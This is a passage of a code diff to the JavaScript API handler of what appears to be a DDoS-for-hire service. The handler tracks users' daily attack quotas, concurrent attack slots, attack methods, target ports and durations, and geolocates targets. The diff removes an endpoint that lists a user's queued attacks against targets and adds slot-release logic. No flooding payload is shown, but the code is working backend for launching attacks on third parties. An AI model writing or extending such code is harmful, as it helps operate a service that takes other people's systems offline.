+          user_capacity: slotCheck.user
+        });
+      }
     }
 
     await Vault.addLog(env, record);
@@ -1027,7 +922,7 @@ export async function apiHandler(parts, request, env) {
 
     const attacks_remaining = Math.max(0, Number(user.max_daily_attacks || 0) - Number(todays || 0));
     const ongoing_now = await Vault.countOngoing(env);
-    const serviceName = await resolveServiceName(user, env, env.API_NAME || 'CAPI');
+    const serviceName = await resolveServiceName(user, env, env.API_NAME || APP_DEFAULTS.DEFAULT_SERVICE_NAME);
     const attackEndTime = performance.now(); // End timing
     const executionTime = attackEndTime - attackStartTime; // Calculate execution time
     const attackId = generateAttackId(); // Generate unique attack ID
@@ -1058,7 +953,6 @@ export async function apiHandler(parts, request, env) {
         target_zip: ipinfo.zip || null,
         username: user.username || qv.username || 'anon',
         max_time: Number(user.max_time || 60),
-        min_time: Number(user.min_time || 30),
         max_concurrents: Number(user.max_concurrents || 1),
         method_max_slots: Number(methodMeta?.max_slots || 0),
         method_active_slots: Number(await Vault.countMethodOngoing(env, record.method)),
@@ -1075,71 +969,12 @@ export async function apiHandler(parts, request, env) {
       }
     };
 
+    releaseAttackSlots(record.username);
     return jsonResponse(responseBody, 200, { service: serviceName });
   }
 
   if (endpoint === 'stop') {
     return jsonResponse({ error: false, kill_id: 1 });
-  }
-
-  /**
-   * Queue Status Endpoint - Check if user has queued attacks and their position
-   * Requires: username and password
-   * Returns: List of queued attacks with position and estimated wait time
-   */
-  if (endpoint === 'queue_status') {
-    const q = parseQuery(request.url);
-    const requestUser = q.username;
-    const requestPass = q.password;
-    
-    if (!requestUser || !requestPass) {
-      return makePolishedError('queue_status requires username and password', 400);
-    }
-
-    const user = await Vault.getUser(env, requestUser);
-    if (!user || user.password !== requestPass) {
-      return makePolishedError('Invalid username or password', 401);
-    }
-
-    // Check rate limiting
-    const rateLimitCheck = checkApiRateLimit(`user:${requestUser}`, 3);
-    if (!rateLimitCheck.allowed) {
-      return makePolishedError(`Rate limited. Try again in ${rateLimitCheck.secondsUntilAvailable.toFixed(1)}s`, 429);
-    }
-
-    try {
-      const queuedAttacks = await Vault.getQueuedAttacks(env, requestUser);
-      const totalQueueLength = await Vault.getQueueLength(env);
-      const averageExecutionTime = 45; // seconds - estimated average attack duration
-      
-      const queueData = (queuedAttacks || []).map((qa, idx) => ({
-        position: qa.position,
-        target: qa.target,
-        method: qa.method,
-        port: qa.port,
-        duration: qa.duration,
-        queued_at: qa.queued_at,
-        queue_reason: qa.reason,
-        estimated_wait_seconds: Math.max(0, (qa.position - 1) * averageExecutionTime),
-        estimated_wait_formatted: `~${Math.ceil((qa.position - 1) * averageExecutionTime / 60)}m`
-      }));
-
-      return jsonResponse({
-        error: false,
-        data: {
-          username: requestUser,
-          has_queued_attacks: queuedAttacks && queuedAttacks.length > 0,
-          queued_count: queuedAttacks ? queuedAttacks.length : 0,
-          global_queue_length: totalQueueLength,
-          queued_attacks: queueData,
-          hint: queuedAttacks && queuedAttacks.length > 0 
-            ? `You have ${queuedAttacks.length} queued attack(s). Position #${queuedAttacks[0].position} is being executed next.`
-            : 'You have no queued attacks right now.'
-        }
-      }, 200, { service: serviceName });
-    } catch (error) {
-      return makePolishedError(`Error retrieving queue status: ${error.message}`, 500);
-    }
   }
 
   return routeNotFound();
